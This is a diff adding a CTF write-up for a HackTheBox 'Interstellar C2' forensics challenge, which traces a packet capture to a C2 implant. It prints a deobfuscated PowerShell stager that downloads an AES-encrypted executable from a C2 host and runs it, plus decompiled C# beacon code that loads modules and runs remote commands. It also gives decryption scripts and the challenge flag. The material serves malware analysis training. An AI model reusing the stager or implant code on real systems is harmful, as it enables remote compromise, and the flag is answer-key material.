@@ -3789,6 +3789,334 @@ There is a JavaScript script. As we can see, `stageClipboard` contains the malic
 
 **Answer:** `stageClipboard`
 
+### XI. Interstella C2:
+> - Link lab: https://app.hackthebox.com/challenges/Interstellar%2520C2?tab=play_challenge
+> - Đề bài:
+> ![image](https://hackmd.io/_uploads/SyzrCYhPMe.png)
+
+- Check the genral traffic flow by moving to `Statistics` >>> `Protocol Hierarchy`:
+![image](https://hackmd.io/_uploads/SJ24Iab_Mx.png)
+And `Conversations`:
+![image](https://hackmd.io/_uploads/H1AvUabufe.png)
+![image](https://hackmd.io/_uploads/HyRlwa-dMe.png)
+As we can see, there has so much connections between `192.168.25.140` and `64.226.84.200`.
+- Filter by `ip.addr==64.226.84.200`:
+![image](https://hackmd.io/_uploads/SJhPYpbuzg.png)
+Check the HTTP Stream of the fourth packet whose title contains `vn84.ps1`:
+![image](https://hackmd.io/_uploads/BJ4iKaWdfx.png)
+There is a PowerShell script, maybe it is AES - 128 - CBC and it was obfuscated. The readable version of this script and its purpose:
+    ``` powershell
+    # 1. Cấu hình các đường dẫn và URL
+    $c2Url = "http://64.226.84.200/94974f08-5853-41ab-938a-ae1bd86d8e51"
+    $downloadedFilePath = "$env:TEMP\94974f08-5853-41ab-938a-ae1bd86d8e51"
+    $extractedExePath   = "$env:TEMP\tmp7102591.exe"
+
+    # 2. Tải tệp đã bị mã hóa từ C2 Server
+    Import-Module BitsTransfer
+    Start-BitsTransfer -Source $c2Url -Destination $downloadedFilePath
+
+    # 3. Khởi tạo đối tượng giải mã AES-128
+    $aes = [System.Security.Cryptography.Aes]::Create()
+    $aes.KeySize = 128
+    $aes.Key = [byte[]]@(0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0)
+    $aes.IV  = [byte[]]@(0, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1)
+
+    # 4. Đọc file mã hóa và thực hiện giải mã trong bộ nhớ
+    $fileStream   = [System.IO.File]::OpenRead($downloadedFilePath)
+    $memoryStream = New-Object System.IO.MemoryStream
+    $cryptoStream = New-Object System.Security.Cryptography.CryptoStream(
+        $memoryStream, 
+        $aes.CreateDecryptor(), 
+        [System.Security.Cryptography.CryptoStreamMode]::Write
+    )
+
+    # Chép dữ liệu từ file vào CryptoStream để giải mã
+    $fileStream.CopyTo($cryptoStream)
+
+    # 5. Lưu dữ liệu đã giải mã thành file .exe và thực thi
+    $decryptedBytes = $memoryStream.ToArray()
+    [System.IO.File]::WriteAllBytes($extractedExePath, $decryptedBytes)
+
+    # Đóng các luồng dữ liệu để giải phóng bộ nhớ
+    $fileStream.Close()
+    $cryptoStream.Close()
+    $memoryStream.Close()
+
+    # Kích chạy file thực thi độc hại
+    Start-Process -FilePath $extractedExePath
+    ```
+- Check the HTTP Stream of the no. 44 packet, which has `/94974f08-5853-41ab-938a-ae1bd86d8e51` in its tilte:
+![image](https://hackmd.io/_uploads/Sy-W6a-_fe.png)
+![image](https://hackmd.io/_uploads/SkBB6T-_Gg.png)
+There is so much weird characters that I cannot guess the mean of them. They are the network traffic created by `Start-BitsTransfer`. Maybe this is the encrypted data of malicious file (`tmp7102591.exe`).
+- Check the HTTP Stream of the no. 70 packet:
+![image](https://hackmd.io/_uploads/Sy7wJ0WdMe.png)
+![image](https://hackmd.io/_uploads/B1jckCZufg.png)
+There is a long strings (from `/Kettie/Emmie/Anni?Theda=Merrilee?c`), maybe it is base64 code. But when I decode it, it cannot be read.
+- Follow the HTTP Stream of packet no. 89:
+![image](https://hackmd.io/_uploads/ByhHm_zufg.png)
+![image](https://hackmd.io/_uploads/rkE2da-uMe.png)
+There is a long strings (from `/Kikelia/Jacinthe/Adorne/Kariotta/Lonee/Krystalle/4b6ab472-7d73-4a7e-95d0-2f691d8424dc/?dVfhJmc2ciKvPOC`), maybe it is is encrypted payload because of downloaded-malware from C2 server (`64.226.84.200`).
+- From the above gathered-information, we can extract `tmp7102591.exe` from the `.pcap` file:
+    - To extract the no.44 packet, display the TCP Stream of this packet as raw format, including only flow from C2 server to client. Then save as `stage2_raw.bin`:
+    ![image](https://hackmd.io/_uploads/Sk-2PdM_Mx.png)
+    - The script to decrypt `stage2_raw.bin` to `tmp7102591.bin`:
+    ``` py
+    from Crypto.Cipher import AES
+
+    def decrypt_stage2_correct(input_file, output_file):
+        key = bytes([0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0])
+        iv  = bytes([0, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1])
+
+        try:
+            with open(input_file, "rb") as f: data = f.read()
+            header_end = data.find(b"\r\n\r\n")
+            offset = 4
+            if header_end == -1:
+                header_end = data.find(b"\n\n")
+                offset = 2
+
+            if header_end != -1: payload = data[header_end + offset:]
+            else: payload = data
+
+            remainder = len(payload) % 16
+            if remainder != 0: payload = payload[:-remainder]
+
+            cipher = AES.new(key, AES.MODE_CBC, iv)
+            decrypted = cipher.decrypt(payload)
+
+            if len(decrypted) > 0:
+                padding_len = decrypted[-1]
+                if 1 <= padding_len <= 16 and decrypted.endswith(bytes([padding_len]) * padding_len): decrypted = decrypted[:-padding_len]
+
+            with open(output_file, "wb") as f_out: f_out.write(decrypted)
+            print(output_file)
+
+        except Exception as e:
+            print(e)
+
+    if __name__ == "__main__":
+        input_path = r"C:\Users\Ha Nguyen\Desktop\a12c7331-5f4f-42d4-baae-6da8ed109a24\stage2_raw.bin"
+        output_path = r"C:\Users\Ha Nguyen\Desktop\a12c7331-5f4f-42d4-baae-6da8ed109a24\tmp7102591.bin"
+        decrypt_stage2_correct(input_path, output_path)
+    ```
+    ![image](https://hackmd.io/_uploads/Bk1zj_zdMg.png)
+    When checking the filehash of `tmp7102591.bin`:
+    ![image](https://hackmd.io/_uploads/SkVweKzuMe.png)
+    The malicious file was extracted successfully. Add the CTF folder into the exclusion in Windows Security, them recheck the hash value of this malicious file:
+    ![image](https://hackmd.io/_uploads/rJSrfYGOzg.png)
+    In [VirusTotal](https://www.virustotal.com/gui/file/89d3cc0572e4ba6a9493ba1bde6bd1e7e5bc8137ffee66f7d97ca205f2400b4c):
+    ![image](https://hackmd.io/_uploads/ry7cGFGufx.png)
+
+- Using [ILSpy](https://github.com/icsharpcode/ILSpy) to analyse the malicious file:
+![image](https://hackmd.io/_uploads/rJQsOP4OMe.png)
+The `main()` function points to `Sharp()` function, and `Sharp()` points to `primer()`:
+![image](https://hackmd.io/_uploads/BJYR5vN_Gx.png)
+![image](https://hackmd.io/_uploads/r1ozoP4_Ml.png)
+- There is a lot to analyse in `primer()`:
+![image](https://hackmd.io/_uploads/HkAhFPNOzl.png)
+    - This code below is used to gather the information of victim's device:
+    ![image](https://hackmd.io/_uploads/Syze3PNdGl.png)
+    - After system reconnaissance, the information is encryted and attach Header Cookie. Then, the `GET` request is sent to `/Kettie/Emmie/Anni?Theda=Merrilee?c` on C2 server. After that, the server receive the response and decrypt it:
+    ![image](https://hackmd.io/_uploads/rJUV6D4_zx.png)
+    We can extract the reply from `.pcap` by using the key `DGCzi057IDmHvgTVE2gm60w8quqfpMD+o8qCBGpYItc=` to extract this parameters.
+    ![image](https://hackmd.io/_uploads/Syjp6wEOfg.png)
+    After that, `ImplantCore()` is called.
+- In `ImplantCore()` function:
+    ``` c#
+    private static void ImplantCore(string baseURL, string RandomURI, string stringURLS, string KillDate, string Sleep, string Key, string stringIMGS, string Jitter)
+    {
+	    UrlGen.Init(stringURLS, RandomURI, baseURL);
+	    ImgGen.Init(stringIMGS);
+	    pKey = Key;
+	    int num = 5;
+	    Regex regex = new Regex("(?<t>[0-9]{1,9})(?<u>[h,m,s]{0,1})", RegexOptions.IgnoreCase | RegexOptions.Compiled);
+	    Match match = regex.Match(Sleep);
+	    if (match.Success)
+	    {
+		    num = Parse_Beacon_Time(match.Groups["t"].Value, match.Groups["u"].Value);
+	    }
+	    StringWriter stringWriter = new StringWriter();
+	    Console.SetOut(stringWriter);
+	    ManualResetEvent manualResetEvent = new ManualResetEvent(initialState: false);
+	    StringBuilder stringBuilder = new StringBuilder();
+	    double result = 0.0;
+	    if (!double.TryParse(Jitter, NumberStyles.Any, CultureInfo.InvariantCulture, out result))
+	    {
+		    result = 0.2;
+	    }
+	    while (!manualResetEvent.WaitOne(new Random().Next((int)((double)(num * 1000) * (1.0 - result)), (int)((double)(num * 1000) * (1.0 + result)))))
+	    {
+		    if (DateTime.ParseExact(KillDate, "yyyy-MM-dd", CultureInfo.InvariantCulture) < DateTime.Now)
+		    {
+			    Run = false;
+			    manualResetEvent.Set();
+			    continue;
+		    }
+		    stringBuilder.Length = 0;
+		    try
+		    {
+			    string text = "";
+			    string cmd = null;
+			    try
+			    {
+				    cmd = GetWebRequest(null).DownloadString(UrlGen.GenerateUrl());
+				    text = Decryption(Key, cmd).Replace("\0", string.Empty);
+			    }
+			    catch
+			    {
+				    goto end_IL_00f1;
+			    }
+			    if (!text.ToLower().StartsWith("multicmd"))
+			    {
+				    continue;
+			    }
+			    string text2 = text.Replace("multicmd", "");
+			    string[] array = text2.Split(new string[1] { "!d-3dion@LD!-d" }, StringSplitOptions.RemoveEmptyEntries);
+			    string[] array2 = array;
+			    foreach (string text3 in array2)
+			    {
+				    taskId = text3.Substring(0, 5);
+				    cmd = text3.Substring(5, text3.Length - 5);
+				    if (cmd.ToLower().StartsWith("exit"))
+				    {
+					    Run = false;
+					    manualResetEvent.Set();
+					    break;
+				    }
+				    if (cmd.ToLower().StartsWith("loadmodule"))
+				    {
+					    string s = Regex.Replace(cmd, "loadmodule", "", RegexOptions.IgnoreCase);
+					    Assembly assembly = Assembly.Load(Convert.FromBase64String(s));
+					    Exec(stringBuilder.ToString(), taskId, Key);
+				    }
+				    else if (cmd.ToLower().StartsWith("run-dll-background") || cmd.ToLower().StartsWith("run-exe-background"))
+				    {
+					    Thread thread = new Thread((ThreadStart)delegate
+					    {
+						    rAsm(cmd);
+					    });
+					    Exec("[+] Running background task", taskId, Key);
+					    thread.Start();
+				    }
+				    else if (cmd.ToLower().StartsWith("run-dll") || cmd.ToLower().StartsWith("run-exe"))
+				    {
+					    stringBuilder.AppendLine(rAsm(cmd));
+				    }
+				    else if (cmd.ToLower().StartsWith("beacon"))
+				    {
+					    Regex regex2 = new Regex("(?<=(beacon)\\s{1,})(?<t>[0-9]{1,9})(?<u>[h,m,s]{0,1})", RegexOptions.IgnoreCase | RegexOptions.Compiled);
+					    Match match2 = regex2.Match(text3);
+					    if (match2.Success)
+					    {
+						    num = Parse_Beacon_Time(match2.Groups["t"].Value, match2.Groups["u"].Value);
+					    }
+					    else
+					    {
+						    stringBuilder.AppendLine($"[X] Invalid time \"{text3}\"");
+					    }
+					    Exec("Beacon set", taskId, Key);
+				    }
+				    else
+				    {
+					    string text4 = rAsm($"run-exe Core.Program Core {cmd}");
+				    }
+    				stringBuilder.AppendLine(stringWriter.ToString());
+				    StringBuilder stringBuilder2 = stringWriter.GetStringBuilder();
+				    stringBuilder2.Remove(0, stringBuilder2.Length);
+				    if (stringBuilder.Length > 2)
+				    {
+					    Exec(stringBuilder.ToString(), taskId, Key);
+				    }
+				    stringBuilder.Length = 0;
+			    }
+			    end_IL_00f1:;
+		    }
+		    catch (NullReferenceException)
+		    {
+		    }
+		    catch (WebException)
+		    {
+		    }
+		    catch (Exception arg)
+		    {
+			    Exec($"Error: {stringBuilder.ToString()} {arg}", "Error", Key);
+		    }
+		    finally
+		    {
+    			stringBuilder.AppendLine(stringWriter.ToString());
+    			StringBuilder stringBuilder3 = stringWriter.GetStringBuilder();
+    			stringBuilder3.Remove(0, stringBuilder3.Length);
+    			if (stringBuilder.Length > 2)
+    			{
+    				Exec(stringBuilder.ToString(), "99999", Key);
+    			}
+    			stringBuilder.Length = 0;
+    		}
+    	}
+    }
+    ```
+    - Malware doesn't maintain a consistent connection, it uses the beaconing traffic. Thereby, the network traffic looks so "normal". Then all the request data is encrypted by AES with the same key.
+    - Some commands that C2 server using to control the victim's device:
+        - `multicmd`
+        - `loadmodule`
+        - `run-dll-background` or `run-exe-background`
+        - `run-dll` or `run-exe`
+        - `beacon`
+    - After gathering information from victim's device, the beacon hides the response inside an image and send back to C2 server (`ImgGen.Init(stringIMGS)`):
+    ![image](https://hackmd.io/_uploads/H1a0V_Ndfx.png)
+- To recover the image, we have to analyse `GetImgData()` function:
+![image](https://hackmd.io/_uploads/ByoNSd4uGl.png)
+The first 1500 bytes is the Header and junk data. C2 server need to skip these bytes, then decrypt the block of data by using AES. So, to extract the image, we have to find the response that includes base64 code and use this script to decrypt it:
+    ``` py
+    import sys
+    import base64
+    from gzip import decompress
+    from Crypto.Cipher import AES
+
+    def decrypt_c2_traffic(file_path, output_name):
+        with open(file_path, "rb") as f: ct = f.read()
+
+        if ct.startswith(b"POST") or ct.startswith(b"HTTP"):
+            header_end = ct.find(b"\r\n\r\n")
+            if header_end != -1: ct = ct[header_end + 4:]
+
+        if len(ct) <= 1500: return
+        ct = ct[1500:]
+        key = base64.b64decode("nUbFDDJadpsuGML4Jxsq58nILvjoNu76u4FIHVGIKSQ=")
+        iv, ciphertext = ct[:16], ct[16:]
+        remainder = len(ciphertext) % 16
+        if remainder != 0: ciphertext = ciphertext[:-remainder]
+
+        cipher = AES.new(key, AES.MODE_CBC, iv)
+        pt = cipher.decrypt(ciphertext)
+
+        if pt.startswith(b"\x1f\x8b"):
+            try:
+                decompressed_pt = decompress(pt)
+                try:
+                    png_data = base64.b64decode(decompressed_pt)
+                    out_file = f"{output_name}.png"
+                    with open(out_file, "wb") as f: f.write(png_data)
+                    print(out_file)
+                except Exception as e: print(e)
+            except Exception as e: print(e)
+
+    if __name__ == "__main__":
+        if not len(sys.argv) < 3: decrypt_c2_traffic(sys.argv[1], sys.argv[2])
+    ```
+    Check if there is a stream containing a PNG file, then extract it (`File` >>> `Export Objects` >>> `HTTP` >>> `in.bin`):
+    - In stream `19`:
+    ![image](https://hackmd.io/_uploads/H12VfnHdGe.png)
+    There is nothing when we extract the object and run the code. Similar to stream `20`:
+    ![image](https://hackmd.io/_uploads/ryWaLiBdGx.png)
+    - In stream `28`:
+    ![image](https://hackmd.io/_uploads/Byf4x3H_fe.png)
+    After extracting it and running the above code, we get a screenshot:
+    ![result](https://hackmd.io/_uploads/rkenZ2BuGl.png)
+
+**FLAG:** `HTB{h0w_c4N_y0U_s3e_p05H_c0mM4nd?}`
+
 ## DFIR-LAB:
 > Link lab: https://github.com/Azr43lKn1ght/DFIR-LABS
 
